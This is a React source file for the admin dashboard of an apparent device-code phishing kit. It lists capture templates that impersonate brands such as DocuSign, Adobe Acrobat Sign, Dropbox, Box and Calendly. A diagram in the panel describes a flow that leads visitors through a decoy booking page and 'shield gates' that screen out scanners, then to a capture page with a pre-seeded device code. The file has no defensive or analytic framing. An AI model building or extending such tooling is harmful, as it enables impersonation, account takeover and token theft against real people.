import React, { useState, useEffect } from 'react';
import type { PageDesign } from '../types';

interface PagesPanelProps {
  storedPassword: string;
}

interface PageOption {
  id: PageDesign;
  name: string;
  description: string;
}

const CAPTURE_TEMPLATES: PageOption[] = [
  { id: 'default', name: 'Secure Portal', description: 'Clean verification flow with device code, step-by-step instructions, and countdown timer.' },
  { id: 'adobe-sign', name: 'Adobe Acrobat Sign', description: 'Document verification theme requesting identity verification to view a shared document.' },
  { id: 'box', name: 'Box', description: 'Secure file access theme with identity verification to access shared files.' },
  { id: 'docusign-centered', name: 'DocuSign — Centered', description: 'Document review theme. Centered layout with identity verification.' },
  { id: 'docusign-split', name: 'DocuSign — Split', description: 'Document review with split-panel design. Brand info left, verification right.' },
  { id: 'dropbox', name: 'Dropbox', description: 'File sharing verification theme with identity verification for shared folders.' },
  { id: 'microsoft-office', name: 'Cloud Workspace', description: 'Cloud productivity portal. Access apps, documents, and collaboration tools.' },
  { id: 'microsoft-verify', name: 'Identity Portal', description: 'Minimal identity verification page with shield icon and step-by-step flow.' },
  { id: 'onedrive', name: 'CloudDrive', description: 'Cloud storage file sharing. Verification to access shared files with document preview.' },
  { id: 'outlook-sync', name: 'MailConnect Sync', description: 'Mail sync setup page. Split-panel with features list and sync progress bar.' },
  { id: 'sharepoint', name: 'DocVault', description: 'Document library access. Verification to view and download shared documents.' },
  { id: 'secureshare', name: 'SecureShare', description: 'Enterprise file transfer. Split-panel with end-to-end encryption messaging.' },
  { id: 'calendar-invite', name: 'MeetSpace — Calendar', description: 'Meeting invitation with date/time. Verify identity to accept and join.' },
  { id: 'calendly-meeting', name: 'Calendly', description: 'Schedule confirmation theme. Verify identity to confirm a scheduled meeting.' },
  { id: 'bookings-meeting', name: 'Bookly — Booking', description: 'Appointment scheduling with calendar and time slot picker.' },
  { id: 'solarwinds-meeting', name: 'SolarWinds', description: 'Dark-themed collaboration space. Verification to access a meeting room.' },
  { id: 'schedule-meeting', name: 'Meeting Scheduler', description: 'Generic meeting scheduling page with calendar icon.' },
  { id: 'it-support', name: 'IT Support Portal', description: 'IT service desk with sidebar navigation, ticket number, and account verification.' },
  { id: 'password-reset', name: 'Security Center — Password', description: 'Password reset flow with 3-step progress bar and lock icon.' },
];

const DECOY_TEMPLATES: PageOption[] = [
  { id: 'bookings-meeting', name: 'Booking Meeting', description: 'Interactive calendar with time slots. Visitors select date/time, click "Schedule Meeting" to proceed.' },
];

export function PagesPanel({ storedPassword }: PagesPanelProps): React.ReactElement {
  const [activeCapture, setActiveCapture] = useState<PageDesign>('default');
  const [activeDecoy, setActiveDecoy] = useState<PageDesign>('bookings-meeting');
  const [saving, setSaving] = useState(false);
  const [saveMsg, setSaveMsg] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadConfig();
  }, []);

  async function loadConfig(): Promise<void> {
    setLoading(true);
    try {
      const res = await fetch('/api/templates', { headers: { 'X-Admin-Password': storedPassword } });
      if (res.ok) {
        const data = await res.json() as { template: string; decoy: string };
        setActiveCapture((data.template || 'default') as PageDesign);
        setActiveDecoy((data.decoy || 'bookings-meeting') as PageDesign);
      }
    } catch { /* defaults */ }
    setLoading(false);
  }

  async function handleSaveCapture(templateId: PageDesign): Promise<void> {
    setSaving(true);
    setSaveMsg('');
    try {
      const res = await fetch('/api/templates', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
        body: JSON.stringify({ template: templateId }),
      });
      const data = await res.json() as { success: boolean };
      if (data.success) {
        setActiveCapture(templateId);
        const name = CAPTURE_TEMPLATES.find(t => t.id === templateId)?.name ?? templateId;
        setSaveMsg(`Capture template set to "${name}". Visitors will see this after passing shield gates.`);
      }
    } catch {
      setSaveMsg('Failed to update template.');
    }
    setSaving(false);
  }

  if (loading) {
    return (
      <div className="dash-loading">
        <div className="dash-spinner" />
        <span>Loading page settings...</span>
      </div>
    );
  }

  const captureInfo = CAPTURE_TEMPLATES.find(t => t.id === activeCapture);
  const decoyInfo = DECOY_TEMPLATES.find(d => d.id === activeDecoy);

  return (
    <div className="pages-panel">
      {/* Flow Diagram */}
      <div style={{
        background: '#f0f6ff',
        border: '1px solid #0078d4',
        borderRadius: 8,
        padding: '16px 20px',
        marginBottom: 24,
      }}>
        <div style={{ fontWeight: 700, marginBottom: 10, color: '#0078d4', fontSize: 15 }}>Visitor Flow</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 10 }}>
          <div style={{ background: '#0078d4', color: '#fff', padding: '6px 14px', borderRadius: 4, fontWeight: 600, fontSize: 13 }}>
            1. {decoyInfo?.name || 'Decoy'}
          </div>
          <span style={{ color: '#999', fontSize: 16 }}>→</span>
          <div style={{ background: '#666', color: '#fff', padding: '6px 14px', borderRadius: 4, fontWeight: 600, fontSize: 13 }}>
            2. Shield Gates
          </div>
          <span style={{ color: '#999', fontSize: 16 }}>→</span>
          <div style={{ background: '#E8352B', color: '#fff', padding: '6px 14px', borderRadius: 4, fontWeight: 600, fontSize: 13 }}>
            3. {captureInfo?.name || 'Capture'}
          </div>
        </div>
        <div style={{ fontSize: 13, color: '#555', lineHeight: 1.5 }}>
          Visitors land on the <strong>Decoy</strong> page (booking calendar). After interaction, 
          they pass through <strong>Shield</strong> (human + hardware fingerprint checks), then see the{' '}
          <strong>Capture</strong> page (device code flow with pre-seeded verification code).
        </div>
      </div>

      {saveMsg && <div className="pages-save-msg">{saveMsg}</div>}

      {/* Decoy Section */}
      <div className="pages-section" style={{ marginBottom: 28 }}>
        <h3 style={{ borderBottom: '2px solid #0078d4', paddingBottom: 6, marginBottom: 12 }}>
          Step 1 — Decoy Page <span style={{ fontSize: 12, fontWeight: 400, color: '#666' }}>(what visitors see first)</span>
        </h3>
        <div className="pages-current" style={{ borderLeftColor: '#0078d4' }}>
          <div className="pages-current-label">Active Decoy</div>
          <div className="pages-current-name">{decoyInfo?.name || 'Booking Meeting'}</div>
          <div className="pages-current-desc">{decoyInfo?.description || 'Interactive calendar with time slots.'}</div>
        </div>
      </div>

      {/* Capture Section */}
      <div className="pages-section">
        <h3 style={{ borderBottom: '2px solid #E8352B', paddingBottom: 6, marginBottom: 12 }}>
          Step 3 — Capture Page <span style={{ fontSize: 12, fontWeight: 400, color: '#666' }}>(device code flow after shield)</span>
        </h3>
        <p className="pages-section-desc" style={{ marginBottom: 12 }}>
          Select the capture template shown after visitors pass through shield gates. Device code is pre-generated server-side.
        </p>

        <div className="pages-ref-grid">
          {CAPTURE_TEMPLATES.map(t => (
            <div key={t.id} className={'pages-ref-item' + (t.id === activeCapture ? ' active' : '')}>
              <div className="pages-ref-header">
                {t.id === activeCapture && <span className="pages-ref-active">ACTIVE</span>}
              </div>
              <div className="pages-ref-name">{t.name}</div>
              <div className="pages-ref-desc">{t.description}</div>
              <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
                {t.id === activeCapture ? (
                  <span style={{ fontSize: 12, color: '#0078d4', fontWeight: 600 }}>Current capture</span>
                ) : (
                  <button
                    onClick={() => handleSaveCapture(t.id)}
                    disabled={saving}
                    style={{
                      fontSize: 12, padding: '4px 12px', border: '1px solid #0078d4',
                      borderRadius: 4, background: '#fff', color: '#0078d4', cursor: 'pointer',
                      fontWeight: 500,
                    }}
                  >
                    {saving ? 'Saving...' : 'Activate'}
                  </button>
                )}
                <a
                  href={`/preview/${t.id}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ fontSize: 12, color: '#666', textDecoration: 'none', padding: '4px 8px' }}
                >
                  Preview ↗
                </a>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
